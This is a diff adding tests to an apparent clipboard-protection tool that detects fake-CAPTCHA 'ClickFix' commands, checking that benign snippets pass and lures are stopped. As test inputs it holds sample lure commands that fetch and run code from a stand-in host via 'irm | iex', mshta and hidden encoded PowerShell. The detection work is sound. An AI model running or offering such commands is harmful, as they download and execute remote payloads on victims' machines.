@@ -68,6 +68,86 @@ test('everyday copied text and ordinary commands are left alone', () => {
   }
 });
 
+test('developer snippets are not stopped, real fake-check commands still are', () => {
+  for (const t of [
+    '$ df -h  # human-readable',
+    'curl -LO https://downloads.test/tool.tar.gz  # then verify the checksum',
+    [
+      "$url = 'https://downloads.test/tool-1.2.zip'",
+      "$out = Join-Path $env:TEMP 'tool.zip'",
+      'Invoke-WebRequest $url -OutFile $out',
+      '# Verify the hash before you run anything',
+      'Get-FileHash $out -Algorithm SHA256'
+    ].join('\n'),
+    '\n\n$ ls -la  # list everything, human sizes'
+  ]) {
+    const found = classify(t);
+    assert.ok(!found || found.level !== 'strong', `${t.slice(0, 60)}: not strong`);
+    assert.notEqual(decide(found, null), 'stop', `${t.slice(0, 60)}: not stopped on a clear page`);
+  }
+  for (const t of [
+    'powershell -w hidden -enc ' + Buffer.from('Write-Output hi', 'utf16le').toString('base64'),
+    'mshta https://lure.test/verify.hta',
+    'cmd /c start /min powershell iwr lure.test/x | iex # I am not a robot - reCAPTCHA Verification ID: 1234',
+    'powershell -c "irm lure.test | iex" # Verification code: 77310',
+    '$ powershell -w hidden -c "irm lure.test | iex"'
+  ]) {
+    const found = classify(t);
+    assert.equal(found && found.level, 'strong', t);
+    assert.equal(decide(found, null), 'stop', t);
+  }
+});
+
+test('the app stops a command copied in a browser, only tells about one copied in another program, and "Put it back" never overwrites a newer copy', async () => {
+  const Module = require('module');
+  let board = 'copied before Sentinel started';
+  const fake = { clipboard: { readText: async () => board, writeText: async (t) => { board = t; } } };
+  const load = Module._load;
+  Module._load = function (req, ...rest) { return req === 'electron' ? fake : load.call(this, req, ...rest); };
+  const file = require.resolve('../desktop/src/clipwatch.js');
+  delete require.cache[file];
+  const cw = require(file);
+  try {
+    let front = null;
+    const events = [];
+    cw.start({ links: () => false, commands: () => true, browserOpen: () => true, browserInFront: () => front, page: () => ({ host: 'lure.test', badge: null }), onCommand: (c) => events.push(c), log: () => {} });
+    await new Promise((r) => setImmediate(r));
+    const cmd = (n) => `powershell -w hidden -enc ${Buffer.from(`Write-Output ${n}`, 'utf16le').toString('base64')}`;
+
+    // Copied in a terminal while a browser runs behind it: told, clipboard left alone, read slowly.
+    board = cmd(1); await cw._test.tick();
+    assert.equal(board, cmd(1));
+    assert.deepEqual([events[0].action, events[0].from, events[0].host], ['tell', 'program', null]);
+    assert.equal(cw.status().every, 1500);
+
+    // Copied with the browser in front: stopped, held for "Put it back", read every half second.
+    front = 'edge';
+    board = cmd(2); await cw._test.tick();
+    assert.match(board, /^Sentinel stopped a command copied from lure\.test/);
+    assert.deepEqual([events[1].action, events[1].from], ['stop', 'browser']);
+    assert.equal(cw.heldCommand().host, 'lure.test');
+    assert.equal(cw.heldCommand().text, undefined, 'the command\'s text never leaves the module');
+    assert.equal(cw.status().every, 500);
+
+    // Something else copied since: "Put it back" leaves it, says why, and the command is let through next time.
+    board = 'a newer copy'; await cw._test.tick();
+    assert.deepEqual(await cw.putBack(), { ok: false, why: 'newer' });
+    assert.equal(board, 'a newer copy');
+    assert.equal(cw.heldCommand(), null);
+    board = cmd(2); await cw._test.tick();
+    assert.equal(board, cmd(2), 'copied again after asking for it back: left alone');
+
+    // The usual case: put back straight away.
+    board = cmd(3); await cw._test.tick();
+    assert.deepEqual(await cw.putBack(), { ok: true });
+    assert.equal(board, cmd(3));
+    assert.deepEqual(await cw.putBack(), { ok: false, why: 'gone' }, 'nothing held any more');
+  } finally {
+    cw.stop();
+    Module._load = load;
+  }
+});
+
 test('the Windows app and the companion carry the same rules', () => {
   assert.equal(read('extension/src/content/clickfix.js'), read('server/lib/scan/clickfix.js'), 'scripts/build-extension.js copies it; commit the copy');
   assert.match(read('desktop/scripts/sync-shared.js'), /'clickfix\.js'/);
